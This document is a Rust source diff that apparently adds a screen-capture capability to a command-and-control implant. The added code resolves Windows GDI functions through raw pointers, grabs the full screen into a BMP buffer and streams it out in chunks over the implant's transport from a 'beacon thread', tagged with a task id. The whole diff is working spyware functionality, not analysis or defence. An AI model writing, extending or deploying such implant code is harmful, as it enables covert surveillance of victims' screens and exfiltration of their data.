@@ -1736,3 +1736,228 @@ pub unsafe fn screenshot_start(instance: &mut Instance, id: u32, results: &mut W
         unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void,
     >(select_obj as *const core::ffi::c_void);
     let bit_blt = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(
+            *mut c_void,
+            i32,
+            i32,
+            i32,
+            i32,
+            *mut c_void,
+            i32,
+            i32,
+            u32,
+        ) -> i32,
+    >(bit_blt as *const core::ffi::c_void);
+    let get_dibits = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut c_void, *mut c_void, u32, u32, *mut u8, *mut u8, u32) -> i32,
+    >(get_dibits as *const core::ffi::c_void);
+    let delete_obj = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut c_void) -> i32,
+    >(delete_obj as *const core::ffi::c_void);
+    let delete_dc = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*mut c_void) -> i32,
+    >(delete_dc as *const core::ffi::c_void);
+
+    let cx = metrics(SM_CXSCREEN);
+    let cy = metrics(SM_CYSCREEN);
+    if cx <= 0 || cy <= 0 {
+        error(kernel32, id, results);
+        return;
+    }
+    let cxu = cx as usize;
+    let cyu = cy as usize;
+
+    let hdc_screen = get_dc(core::ptr::null());
+    if hdc_screen.is_null() {
+        error(kernel32, id, results);
+        return;
+    }
+    let hdc_mem = compat_dc(hdc_screen);
+    let bmp = compat_bmp(hdc_screen, cx, cy);
+    let old = select_obj(hdc_mem, bmp);
+    bit_blt(hdc_mem, 0, 0, cx, cy, hdc_screen, 0, 0, SRCCOPY);
+
+    // Bit-depth tiering (native): 24bpp if the pixels fit the cap, 8bpp
+    // grayscale (palette) otherwise.
+    let row24 = (cxu * 3 + 3) & !3;
+    let size24 = row24 * cyu;
+    let use8 = 54 + size24 > SHOT_CAP;
+    let (hdr_size, img_size, bpp) = if use8 {
+        let row8 = (cxu + 3) & !3;
+        let size8 = 54 + 1024 + row8 * cyu;
+        if size8 > SHOT_CAP {
+            select_obj(hdc_mem, old);
+            delete_obj(bmp);
+            delete_dc(hdc_mem);
+            release_dc(core::ptr::null(), hdc_screen);
+            error(kernel32, id, results);
+            return;
+        }
+        (54 + 1024, row8 * cyu, 8u16)
+    } else {
+        (54, size24, 24u16)
+    };
+    let total = hdr_size + img_size;
+
+    let buf = heap.allocate(total);
+    if buf.is_null() {
+        select_obj(hdc_mem, old);
+        delete_obj(bmp);
+        delete_dc(hdc_mem);
+        release_dc(core::ptr::null(), hdc_screen);
+        error(kernel32, id, results);
+        return;
+    }
+
+    // BITMAPFILEHEADER (14 bytes): 'BM', total size, reserved, pixel offset.
+    *buf.add(0) = b'B';
+    *buf.add(1) = b'M';
+    let mut le = (total as u32).to_le_bytes();
+    let mut i = 0;
+    while i < 4 {
+        *buf.add(2 + i) = le[i];
+        i += 1;
+    }
+    le = (hdr_size as u32).to_le_bytes();
+    let mut i = 0;
+    while i < 4 {
+        *buf.add(10 + i) = le[i];
+        i += 1;
+    }
+
+    // BITMAPINFOHEADER (40 bytes, LE): top-down (negative height).
+    let mut bi = [0u8; 40];
+    bi[0] = 40;
+    le = (cx as u32).to_le_bytes();
+    bi[4] = le[0];
+    bi[5] = le[1];
+    bi[6] = le[2];
+    bi[7] = le[3];
+    le = ((-cy) as u32).to_le_bytes();
+    bi[8] = le[0];
+    bi[9] = le[1];
+    bi[10] = le[2];
+    bi[11] = le[3];
+    bi[12] = 1; // biPlanes
+    bi[14] = (bpp & 0xff) as u8;
+    bi[15] = (bpp >> 8) as u8;
+    le = (img_size as u32).to_le_bytes();
+    bi[20] = le[0];
+    bi[21] = le[1];
+    bi[22] = le[2];
+    bi[23] = le[3];
+    if use8 {
+        le = 256u32.to_le_bytes();
+        bi[32] = le[0];
+        bi[33] = le[1];
+        bi[34] = le[2];
+        bi[35] = le[3];
+        bi[36] = le[0];
+        bi[37] = le[1];
+        bi[38] = le[2];
+        bi[39] = le[3];
+    }
+    let mut i = 0;
+    while i < 40 {
+        *buf.add(14 + i) = bi[i];
+        i += 1;
+    }
+    if use8 {
+        // Grayscale palette: [b, g, r, 0] = [i, i, i, 0].
+        let mut i = 0;
+        while i < 256 {
+            *buf.add(54 + i * 4) = i as u8;
+            *buf.add(54 + i * 4 + 1) = i as u8;
+            *buf.add(54 + i * 4 + 2) = i as u8;
+            *buf.add(54 + i * 4 + 3) = 0;
+            i += 1;
+        }
+    }
+
+    // GetDIBits wants its own BITMAPINFO (header [+ palette]) and writes
+    // the pixels straight into the heap buffer, past the file headers.
+    let mut bmi = [0u8; 40 + 1024];
+    let mut i = 0;
+    while i < 40 {
+        bmi[i] = bi[i];
+        i += 1;
+    }
+    if use8 {
+        let mut i = 0;
+        while i < 256 {
+            bmi[40 + i * 4] = i as u8;
+            bmi[40 + i * 4 + 1] = i as u8;
+            bmi[40 + i * 4 + 2] = i as u8;
+            bmi[40 + i * 4 + 3] = 0;
+            i += 1;
+        }
+    }
+    let scanlines = get_dibits(
+        hdc_mem,
+        bmp,
+        0,
+        cy as u32,
+        buf.add(hdr_size),
+        bmi.as_mut_ptr(),
+        0, // DIB_RGB_COLORS
+    );
+
+    // Cleanup: every GDI object goes back before the result is decided.
+    select_obj(hdc_mem, old);
+    delete_obj(bmp);
+    delete_dc(hdc_mem);
+    release_dc(core::ptr::null(), hdc_screen);
+
+    if scanlines != cy {
+        heap.deallocate(buf);
+        error(kernel32, id, results);
+        return;
+    }
+    instance.screenshot = Some(ShotState {
+        task_id: id,
+        buf,
+        len: total,
+        cursor: 0,
+        started: false,
+    });
+}
+
+/// Stream the pending screenshot: START once, then one SHOT_CHUNK CONTINUE
+/// per cycle, FINISH at the end. A failed push (body frame full - download
+/// active) retries next cycle.
+///
+/// # Safety
+///
+/// Beacon thread; the buffer belongs to the instance heap.
+pub unsafe fn screenshot_tick(instance: &mut Instance, w: &mut Writer) {
+    let Some(shot) = instance.screenshot.as_mut() else {
+        return;
+    };
+    if !shot.started {
+        if !transport::push_screenshot_start(w, shot.task_id, shot.len as u64) {
+            return;
+        }
+        shot.started = true;
+    }
+    let take = (shot.len - shot.cursor).min(SHOT_CHUNK);
+    if take == 0 {
+        return;
+    }
+    let chunk = core::slice::from_raw_parts(shot.buf.add(shot.cursor), take);
+    if !transport::push_screenshot_continue(w, shot.task_id, chunk) {
+        return; // body full — retry next cycle
+    }
+    shot.cursor += take;
+    if shot.cursor == shot.len {
+        let _ = transport::push_screenshot_finish(w, shot.task_id);
+        let buf = shot.buf;
+        if let Some(heap) = instance.heap {
+            heap.deallocate(buf);
+        }
+        instance.screenshot = None;
+    }
+}
